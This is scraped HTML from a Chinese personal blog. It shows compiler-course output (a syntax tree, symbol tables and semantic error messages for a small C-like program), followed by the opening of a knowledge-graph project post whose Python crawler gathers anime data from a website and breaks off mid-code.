class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br></pre></td><td class="code"><pre><span class="line"><span class="code"> 外部变量定义：</span></span><br><span class="line"><span class="code">     类型：int</span></span><br><span class="line"><span class="code">     变量名：</span></span><br><span class="line"><span class="code">          ID： a</span></span><br><span class="line"><span class="code">          ID： b</span></span><br><span class="line"><span class="code">          ID： c</span></span><br><span class="line"><span class="code"> 外部变量定义：</span></span><br><span class="line"><span class="code">     类型：float</span></span><br><span class="line"><span class="code">     变量名：</span></span><br><span class="line"><span class="code">          ID： m</span></span><br><span class="line"><span class="code">          ID： n</span></span><br><span class="line"><span class="code"> 外部变量定义：</span></span><br><span class="line"><span class="code">     类型：char</span></span><br><span class="line"><span class="code">     变量名：</span></span><br><span class="line"><span class="code">          ID： c1</span></span><br><span class="line"><span class="code">          ID： c2</span></span><br><span class="line"><span class="code"> 数组定义：</span></span><br><span class="line"><span class="code">     类型：char</span></span><br><span class="line"><span class="code">     数组名：h</span></span><br><span class="line"><span class="code">     数组大小：</span></span><br><span class="line"><span class="code">          INT： 10</span></span><br><span class="line"><span class="code"> 外部变量定义：</span></span><br><span class="line"><span class="code">     类型：float</span></span><br><span class="line"><span class="code">     变量名：</span></span><br><span class="line"><span class="code">          ID： a</span></span><br><span class="line"><span class="code">          ID： b</span></span><br><span class="line"><span class="code"> 函数定义：</span></span><br><span class="line"><span class="code">     类型：int</span></span><br><span class="line"><span class="code">     函数名：fibo</span></span><br><span class="line"><span class="code">     函数型参：</span></span><br><span class="line"><span class="code">          类型：int</span></span><br><span class="line"><span class="code">          ID： a</span></span><br><span class="line"><span class="code">     复合语句：</span></span><br><span class="line"><span class="code">          复合语句的变量定义：</span></span><br><span class="line"><span class="code">               局部变量名：</span></span><br><span class="line"><span class="code">                    类型：int</span></span><br><span class="line"><span class="code">                    变量名：</span></span><br><span class="line"><span class="code">                         ID： i</span></span><br><span class="line"><span class="code">               局部变量名：</span></span><br><span class="line"><span class="code">                    类型：int</span></span><br><span class="line"><span class="code">                    变量名：</span></span><br><span class="line"><span class="code">                         ID： haha</span></span><br><span class="line"><span class="code">          复合语句的语句部分：</span></span><br><span class="line"><span class="code">               条件语句（if-else）：</span></span><br><span class="line"><span class="code">               条件：</span></span><br><span class="line"><span class="code">                    OR</span></span><br><span class="line"><span class="code">                         ==</span></span><br><span class="line"><span class="code">                              ID： a</span></span><br><span class="line"><span class="code">                              INT： 1</span></span><br><span class="line"><span class="code">                         ==</span></span><br><span class="line"><span class="code">                              ID： a</span></span><br><span class="line"><span class="code">                              INT： 2</span></span><br><span class="line"><span class="code">               IF语句：</span></span><br><span class="line"><span class="code">                    复合语句：</span></span><br><span class="line"><span class="code">                         复合语句的变量定义：</span></span><br><span class="line"><span class="code">                         复合语句的语句部分：</span></span><br><span class="line"><span class="code">                              返回语句：</span></span><br><span class="line"><span class="code">                                   INT： 1</span></span><br><span class="line"><span class="code">               循环语句（for）：</span></span><br><span class="line"><span class="code">                    循环条件：</span></span><br><span class="line"><span class="code">                    &lt;</span></span><br><span class="line"><span class="code">                         ID： i</span></span><br><span class="line"><span class="code">                         INT： 15</span></span><br><span class="line"><span class="code">                    循环体：</span></span><br><span class="line"><span class="code">                    复合语句：</span></span><br><span class="line"><span class="code">                         复合语句的变量定义：</span></span><br><span class="line"><span class="code">                         复合语句的语句部分：</span></span><br><span class="line"><span class="code">                              表达式语句：</span></span><br><span class="line"><span class="code">                                   AUTOADD</span></span><br><span class="line"><span class="code">                                        ID： i</span></span><br><span class="line"><span class="code">               表达式语句：</span></span><br><span class="line"><span class="code">                    ASSIGNOP</span></span><br><span class="line"><span class="code">                         ID： j</span></span><br><span class="line"><span class="code">                         PLUS</span></span><br><span class="line"><span class="code">                              ID： i</span></span><br><span class="line"><span class="code">                              INT： 1</span></span><br><span class="line"><span class="code">               表达式语句：</span></span><br><span class="line"><span class="code">                    函数调用：</span></span><br><span class="line"><span class="code">                         函数名：haha</span></span><br><span class="line"><span class="code">                         第一个实际参数表达式：</span></span><br><span class="line"><span class="code">                              ID： c</span></span><br><span class="line"><span class="code">               表达式语句：</span></span><br><span class="line"><span class="code">                    ASSIGNOP</span></span><br><span class="line"><span class="code">                         ID： a</span></span><br><span class="line"><span class="code">                         函数调用：</span></span><br><span class="line"><span class="code">                              函数名：fibo</span></span><br><span class="line"><span class="code">                              第一个实际参数表达式：</span></span><br><span class="line"><span class="code">                                   INT： 1</span></span><br><span class="line"><span class="code">                                        INT： 2</span></span><br><span class="line"><span class="code">               表达式语句：</span></span><br><span class="line"><span class="code">                    ASSIGNOP</span></span><br><span class="line"><span class="code">                         ID： b</span></span><br><span class="line"><span class="code">                         函数调用：</span></span><br><span class="line"><span class="code">                              函数名：fibo</span></span><br><span class="line"><span class="code">                              第一个实际参数表达式：</span></span><br><span class="line"><span class="code">                                   ID： m</span></span><br><span class="line"><span class="code">               返回语句：</span></span><br><span class="line"><span class="code">                    PLUS</span></span><br><span class="line"><span class="code">                         函数调用：</span></span><br><span class="line"><span class="code">                              函数名：fibo</span></span><br><span class="line"><span class="code">                              第一个实际参数表达式：</span></span><br><span class="line"><span class="code">                                   MINUS</span></span><br><span class="line"><span class="code">                                        ID： a</span></span><br><span class="line"><span class="code">                                        INT： 1</span></span><br><span class="line"><span class="code">                         函数调用：</span></span><br><span class="line"><span class="code">                              函数名：fibo</span></span><br><span class="line"><span class="code">                              第一个实际参数表达式：</span></span><br><span class="line"><span class="code">                                   MINUS</span></span><br><span class="line"><span class="code">                                        ID： a</span></span><br><span class="line"><span class="code">                                        INT： 2</span></span><br><span class="line"><span class="code"> 函数定义：</span></span><br><span class="line"><span class="code">     类型：int</span></span><br><span class="line"><span class="code">     函数名：h1</span></span><br><span class="line"><span class="code">     函数型参：</span></span><br><span class="line"><span class="code">          类型：int</span></span><br><span class="line"><span class="code">          ID： a</span></span><br><span class="line"><span class="code">          类型：int</span></span><br><span class="line"><span class="code">          ID： a</span></span><br><span class="line"><span class="code">     复合语句：</span></span><br><span class="line"><span class="code">          复合语句的变量定义：</span></span><br><span class="line"><span class="code">          复合语句的语句部分：</span></span><br><span class="line"><span class="code"> 函数定义：</span></span><br><span class="line"><span class="code">     类型：int</span></span><br><span class="line"><span class="code">     函数名：h2</span></span><br><span class="line"><span class="code">     函数型参：</span></span><br><span class="line"><span class="code">     复合语句：</span></span><br><span class="line"><span class="code">          复合语句的变量定义：</span></span><br><span class="line"><span class="code">               局部变量名：</span></span><br><span class="line"><span class="code">                    类型：int</span></span><br><span class="line"><span class="code">                    变量名：</span></span><br><span class="line"><span class="code">                         ID： hah</span></span><br><span class="line"><span class="code">               局部变量名：</span></span><br><span class="line"><span class="code">                    类型：float</span></span><br><span class="line"><span class="code">                    变量名：</span></span><br><span class="line"><span class="code">                         ID： hah</span></span><br><span class="line"><span class="code">          复合语句的语句部分：</span></span><br><span class="line"><span class="code"> 函数定义：</span></span><br><span class="line"><span class="code">     类型：float</span></span><br><span class="line"><span class="code">     函数名：h1</span></span><br><span class="line"><span class="code">     函数型参：</span></span><br><span class="line"><span class="code">     复合语句：</span></span><br><span class="line"><span class="code">          复合语句的变量定义：</span></span><br><span class="line"><span class="code">          复合语句的语句部分：</span></span><br><span class="line">ERROR！第6行：全局变量中出现相同变量名a</span><br><span class="line">ERROR！第6行：全局变量中出现相同变量名b</span><br><span class="line"><span class="section">		***Symbol Table***</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"><span class="section">Index	Name	Level	Type	Flag	Param_num</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line">0	a	0	int	V	</span><br><span class="line">1	b	0	int	V	</span><br><span class="line">2	c	0	int	V	</span><br><span class="line">3	m	0	float	V	</span><br><span class="line">4	n	0	float	V	</span><br><span class="line">5	c1	0	char	V	</span><br><span class="line">6	c2	0	char	V	</span><br><span class="line">7	h	0	char	A	</span><br><span class="line">8	fibo	0	int	F	1</span><br><span class="line">9	a	1	int	P	</span><br><span class="line">10	i	1	int	T	</span><br><span class="line"><span class="section">11	haha	1	int	T	</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="section">		***Symbol Table***</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"><span class="section">Index	Name	Level	Type	Flag	Param_num</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line">0	a	0	int	V	</span><br><span class="line">1	b	0	int	V	</span><br><span class="line">2	c	0	int	V	</span><br><span class="line">3	m	0	float	V	</span><br><span class="line">4	n	0	float	V	</span><br><span class="line">5	c1	0	char	V	</span><br><span class="line">6	c2	0	char	V	</span><br><span class="line">7	h	0	char	A	</span><br><span class="line">8	fibo	0	int	F	1</span><br><span class="line">9	a	1	int	P	</span><br><span class="line">10	i	1	int	T	</span><br><span class="line"><span class="section">11	haha	1	int	T	</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">ERROR！第21行：变量名j未定义</span><br><span class="line">ERROR！第21行：赋值类型不匹配</span><br><span class="line">ERROR！第22行：函数haha未定义</span><br><span class="line">ERROR！第23行：函数调用fibo参数个数不匹配</span><br><span class="line">ERROR！第23行：赋值类型不匹配</span><br><span class="line">ERROR！第24行：函数调用的第1个参数类型不匹配</span><br><span class="line">ERROR！第24行：赋值类型不匹配</span><br><span class="line"><span class="section">		***Symbol Table***</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"><span class="section">Index	Name	Level	Type	Flag	Param_num</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line">0	a	0	int	V	</span><br><span class="line">1	b	0	int	V	</span><br><span class="line">2	c	0	int	V	</span><br><span class="line">3	m	0	float	V	</span><br><span class="line">4	n	0	float	V	</span><br><span class="line">5	c1	0	char	V	</span><br><span class="line">6	c2	0	char	V	</span><br><span class="line">7	h	0	char	A	</span><br><span class="line">8	fibo	0	int	F	1</span><br><span class="line">9	a	1	int	P	</span><br><span class="line">10	i	1	int	T	</span><br><span class="line"><span class="section">11	haha	1	int	T	</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="section">		***Symbol Table***</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"><span class="section">Index	Name	Level	Type	Flag	Param_num</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line">0	a	0	int	V	</span><br><span class="line">1	b	0	int	V	</span><br><span class="line">2	c	0	int	V	</span><br><span class="line">3	m	0	float	V	</span><br><span class="line">4	n	0	float	V	</span><br><span class="line">5	c1	0	char	V	</span><br><span class="line">6	c2	0	char	V	</span><br><span class="line">7	h	0	char	A	</span><br><span class="line">8	fibo	0	int	F	1</span><br><span class="line"><span class="section">9	a	1	int	P	</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">ERROR！第29行：函数参数中中出现了相同的变量名a</span><br><span class="line">ERROR！第29行：函数参数中中出现了相同的变量名a</span><br><span class="line"><span class="section">		***Symbol Table***</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"><span class="section">Index	Name	Level	Type	Flag	Param_num</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line">0	a	0	int	V	</span><br><span class="line">1	b	0	int	V	</span><br><span class="line">2	c	0	int	V	</span><br><span class="line">3	m	0	float	V	</span><br><span class="line">4	n	0	float	V	</span><br><span class="line">5	c1	0	char	V	</span><br><span class="line">6	c2	0	char	V	</span><br><span class="line">7	h	0	char	A	</span><br><span class="line">8	fibo	0	int	F	2</span><br><span class="line">9	a	1	int	P	</span><br><span class="line"><span class="section">10	h1	0	int	F	0</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="section">		***Symbol Table***</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"><span class="section">Index	Name	Level	Type	Flag	Param_num</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line">0	a	0	int	V	</span><br><span class="line">1	b	0	int	V	</span><br><span class="line">2	c	0	int	V	</span><br><span class="line">3	m	0	float	V	</span><br><span class="line">4	n	0	float	V	</span><br><span class="line">5	c1	0	char	V	</span><br><span class="line">6	c2	0	char	V	</span><br><span class="line">7	h	0	char	A	</span><br><span class="line">8	fibo	0	int	F	2</span><br><span class="line">9	a	1	int	P	</span><br><span class="line"><span class="section">10	h1	0	int	F	0</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">ERROR！第31行：局部变量中出现了相同的变量名hah</span><br><span class="line"><span class="section">		***Symbol Table***</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"><span class="section">Index	Name	Level	Type	Flag	Param_num</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line">0	a	0	int	V	</span><br><span class="line">1	b	0	int	V	</span><br><span class="line">2	c	0	int	V	</span><br><span class="line">3	m	0	float	V	</span><br><span class="line">4	n	0	float	V	</span><br><span class="line">5	c1	0	char	V	</span><br><span class="line">6	c2	0	char	V	</span><br><span class="line">7	h	0	char	A	</span><br><span class="line">8	fibo	0	int	F	2</span><br><span class="line">9	a	1	int	P	</span><br><span class="line">10	h1	0	int	F	0</span><br><span class="line">11	h2	0	int	F	0</span><br><span class="line"><span class="section">12	hah	1	int	T	</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="section">		***Symbol Table***</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"><span class="section">Index	Name	Level	Type	Flag	Param_num</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line">0	a	0	int	V	</span><br><span class="line">1	b	0	int	V	</span><br><span class="line">2	c	0	int	V	</span><br><span class="line">3	m	0	float	V	</span><br><span class="line">4	n	0	float	V	</span><br><span class="line">5	c1	0	char	V	</span><br><span class="line">6	c2	0	char	V	</span><br><span class="line">7	h	0	char	A	</span><br><span class="line">8	fibo	0	int	F	2</span><br><span class="line">9	a	1	int	P	</span><br><span class="line">10	h1	0	int	F	0</span><br><span class="line"><span class="section">11	h2	0	int	F	0</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="section">		***Symbol Table***</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"><span class="section">Index	Name	Level	Type	Flag	Param_num</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line">0	a	0	int	V	</span><br><span class="line">1	b	0	int	V	</span><br><span class="line">2	c	0	int	V	</span><br><span class="line">3	m	0	float	V	</span><br><span class="line">4	n	0	float	V	</span><br><span class="line">5	c1	0	char	V	</span><br><span class="line">6	c2	0	char	V	</span><br><span class="line">7	h	0	char	A	</span><br><span class="line">8	fibo	0	int	F	2</span><br><span class="line">9	a	1	int	P	</span><br><span class="line">10	h1	0	int	F	0</span><br><span class="line">11	h2	0	int	F	0</span><br><span class="line"><span class="section">12	h1	0	float	F	0</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="section">		***Symbol Table***</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line"><span class="section">Index	Name	Level	Type	Flag	Param_num</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br><span class="line">0	a	0	int	V	</span><br><span class="line">1	b	0	int	V	</span><br><span class="line">2	c	0	int	V	</span><br><span class="line">3	m	0	float	V	</span><br><span class="line">4	n	0	float	V	</span><br><span class="line">5	c1	0	char	V	</span><br><span class="line">6	c2	0	char	V	</span><br><span class="line">7	h	0	char	A	</span><br><span class="line">8	fibo	0	int	F	2</span><br><span class="line">9	a	1	int	P	</span><br><span class="line">10	h1	0	int	F	0</span><br><span class="line">11	h2	0	int	F	0</span><br><span class="line"><span class="section">12	h1	0	float	F	0</span></span><br><span class="line"><span class="section">---------------------------------------------------</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/17/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E5%9B%9B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/17/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%9E%E8%B7%B5%E9%A1%B9%E7%9B%AE%E5%9B%9B/" class="post-title-link" itemprop="url">知识图谱实践项目四</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-03-17 20:18:59 / Modified: 20:20:06" itemprop="dateCreated datePublished" datetime="2023-03-17T20:18:59+08:00">2023-03-17</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge-Graph/" itemprop="url" rel="index"><span itemprop="name">Knowledge Graph</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="知识图谱实践项目四"><a href="#知识图谱实践项目四" class="headerlink" title="知识图谱实践项目四"></a>知识图谱实践项目四</h2><p>对爬虫和知识图谱进行了简单的升级，扩展了爬取的信息</p>
<p>爬虫：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin, urlencode</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crawler</span>:</span></span><br><span class="line">    target_url = <span class="string">&#x27;https://www.bnacg.com/dm/list_1_&#x27;</span></span><br><span class="line">    base_url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    name_file = <span class="number">0</span></span><br><span class="line">    platform_file = <span class="number">0</span></span><br><span class="line">    seiyuu_file = <span class="number">0</span></span><br><span class="line">    classify_file = <span class="number">0</span></span><br><span class="line">    role_name_file = <span class="number">0</span></span><br><span class="line">    role_img_file = <span class="number">0</span></span><br><span class="line">    author_file = <span class="number">0</span></span><br><span class="line">    content_file = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_base_html</span>(<span class="params">self,url</span>):</span></span><br><span class="line">        res = requests.get(url,headers)</span><br><span class="line">        text = res.text.encode(<span class="string">&#x27;ISO-8859-1&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_list</span>(<span class="params">self</span>):</span></span><br><span class="line">        base_html = self.get_base_html(self.base_url)</span><br><span class="line">        soup = BeautifulSoup(base_html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        html = soup.findAll(<span class="string">&quot;ul&quot;</span>, &#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;result-list&quot;</span>&#125;)</span><br><span class="line">        url_list = re.findall(<span class="string">&#x27;&lt;a class=&quot;img-wrap&quot; href=&quot;(.*?)&quot; rel=&quot;nofollow&quot;&#x27;</span>, <span class="built_in">str</span>(html))</span><br><span class="line"></span><br><span class="line">        name_list = []</span><br><span class="line">        name_img_list = []</span><br><span class="line">        author_list = []</span><br><span class="line">        role_img_list = []</span><br><span class="line">        role_name_list = []</span><br><span class="line">        classify_list = []</span><br><span class="line">        seiyuu_list =[]</span><br><span class="line">        platform_list = []</span><br><span class="line">        content_list = []</span><br><span class="line">        role_content_list = []</span><br><span class="line">        time_list = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> 